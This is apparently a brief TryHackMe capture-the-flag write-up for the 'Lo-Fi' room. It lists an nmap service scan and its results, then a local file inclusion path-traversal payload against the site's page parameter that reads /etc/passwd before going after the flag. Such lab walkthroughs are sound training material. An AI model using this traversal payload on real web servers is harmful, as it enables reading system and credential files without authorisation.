---
title: lo-fi writeup
description: 
date: 2026-02-28 21:00:21+0000
categories:
    - tryhackme
tags:
    - tryhackme
---
- nmap scan
```
nmap -sVC -p- $IP
```
- resultS
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Lo-Fi Music
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- check web server

- play around bit you will find page parameter is vulnerable to LFI

- traverse enough to land in root `/`
- `=../../../../../../../../../../../..//etc/passwd`
- now flag.txt

*****************************************